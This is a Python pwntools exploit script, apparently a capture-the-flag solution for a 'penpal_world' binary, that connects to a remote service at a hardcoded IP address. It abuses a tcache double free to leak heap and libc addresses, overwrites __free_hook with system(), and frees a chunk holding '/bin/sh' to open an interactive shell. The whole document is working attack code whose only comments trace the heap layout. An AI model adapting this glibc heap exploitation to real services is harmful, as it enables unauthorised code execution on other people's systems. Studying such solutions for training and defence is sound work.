#!/usr/bin/env python3

from pwn import *

exe = ELF("./penpal_world.elf")
libc = ELF("./libc-2.27.so")
# libc6_2.27-3ubuntu1.2_amd64.so

s  = remote("109.233.56.90", 11753)
# s = process(["./ld-2.27.so", exe.path], env={"LD_PRELOAD":"./libc-2.27.so"})

def main():
	# 1) Create a postcard
	# 2) Edit a postcard
	# 3) Discard a postcard
	# 4) Read a postcard

	add(0)		#malloc(0x48)=0x..260
	free(0)		#chunk[0].fd=0x..000
	free(0)		#chunk[0].fd=0x..260 (by itself)
	read(0)		#read 0x..260
	heap_base = s.recvline(keepends=False)
	heap_base = u64(heap_base.ljust(8, b'\x00')) - 0x60

	edit(0, p64(heap_base+0x90))	#target to WriterChunk (under ordinary chunk's __size__ )
	add(0)		#malloc(0x48)=0x..260
	add(1)		#malloc(0x48)=0x..290 ~ WriterChunk
	add(0) 		#malloc(0x48)=0x..2b0 ~ ordinary chunk (victim)

	edit(1, p64(0)*3+p64(0x91))	#to be able to fall into unsorted_bin
	add(1)		#to next step
	edit(1, b'C'*0x30 +p64(0x0)+p64(0x11))	#to solve "double free or corruption (!prev)"
	for i in range(7):
		free(0)	#filling tcache
	free(0)		#fall in unsorted_bin: chunk[0].fd=0x7f.. (libc)

	read(0)		#read 0x7f.. (libc)
	libc_base = s.recvline(keepends=False)
	libc_base = u64(libc_base.ljust(8, b'\x00')) - 0x3ebca0

	free_hook = libc_base + libc.sym["__free_hook"]
	system_plt = libc_base + libc.sym["system"]

	add(0)		#malloc(0x48)=0x..2b0
	free(0)		#fd=0x..000
	free(0)		#fd=0x..2b0 (by itself)
	edit(0, p64(free_hook))	#target to __free_hook
	add(0)		#malloc(0x48)=0x..2b0
	add(0)		#malloc(0x48)=__free_hook
	edit(0, p64(system_plt))	#__free_hook=system()
	edit(1, b'/bin/sh')	#chunk[1]='/bin/sh'
	free(1)		#system('/bin/sh')

	# gdb.attach(s, gdbscript=f"x/64gx {heap_base+0x60}-0x10\nheap bins")
	s.interactive()


def add(i):
	s.sendline(f'1 {i}'.encode())
	s.recvuntil(b'Which envelope #?\n')


def free(i):
	s.sendline(f'3 {i}'.encode())
	s.recvuntil(b'Which envelope #?\n')


def read(i):
	s.sendline(f'4 {i}'.encode())
	s.recvuntil(b'Which envelope #?\n')


def edit(i, data, n=0x48):
	s.sendline(f'2 {i}'.encode())
	s.recvuntil(b'Which envelope #?\n')
	s.sendline(data.ljust(n, b'\x00'))


if __name__=="__main__":
	main()